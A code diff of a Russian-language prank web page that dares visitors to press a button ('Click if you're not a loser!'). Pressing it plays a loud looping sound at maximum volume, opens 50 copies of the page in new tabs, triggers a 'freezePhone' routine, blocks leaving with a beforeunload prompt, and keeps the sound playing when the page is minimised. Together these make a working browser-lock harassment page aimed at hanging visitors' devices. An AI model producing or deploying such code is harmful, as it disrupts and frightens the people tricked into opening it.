@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Весёлый сайт</title>
+    <title>Ты не лох?</title>
     <style>
         body {
             margin: 0;
@@ -13,23 +14,27 @@
             height: 100vh;
             background-color: black;
             color: white;
-            font-size: 5rem;
+            font-size: 3rem;
             font-family: Arial, sans-serif;
             text-transform: uppercase;
             text-align: center;
             flex-direction: column;
         }
-        button {
-            font-size: 2rem;
-            padding: 20px;
+        #big-button {
+            font-size: 4rem;
+            padding: 40px 80px;
             margin-top: 20px;
             cursor: pointer;
+            background-color: red;
+            color: white;
+            border: none;
+            border-radius: 10px;
         }
     </style>
 </head>
 <body>
-    <div id="text">Нажми, если не лох</div>
-    <button onclick="startMadness()">НАЖМИ!</button>
+    <div>Нажми, если не лох!</div>
+    <button id="big-button" onclick="startMadness()">НАЖМИ!</button>
     <audio id="sound" src="https://www.myinstants.com/media/sounds/stony-prank-mem-2025.mp3" loop></audio>
 
     <script>
@@ -39,12 +44,13 @@
             sound.volume = 1.0; // Громкость на максимум
             sound.play().catch(err => console.log("Ошибка автозапуска:", err));
 
-            setTimeout(spamTabs, 1000); // Открытие вкладок через 1 секунду
-            setTimeout(freezePhone, 2000); // Запуск зависания через 2 секунды
+            setTimeout(spamTabs, 500); // Открытие вкладок через 0.5 сек
+            setTimeout(freezePhone, 1500); // Запуск зависания через 1.5 сек
+            document.getElementById("big-button").style.display = "none"; // Прячем кнопку
         }
 
         function spamTabs() {
-            for (let i = 0; i < 100; i++) {
+            for (let i = 0; i < 50; i++) { // Открываем 50 вкладок
                 window.open(window.location.href, '_blank');
             }
         }
@@ -58,6 +64,13 @@
         window.onbeforeunload = function() {
             return "Ты точно хочешь уйти?";
         };
+
+        // Продолжение звука при сворачивании (для Android)
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                sound.play();
+            }
+        });
     </script>
 </body>
 </html>
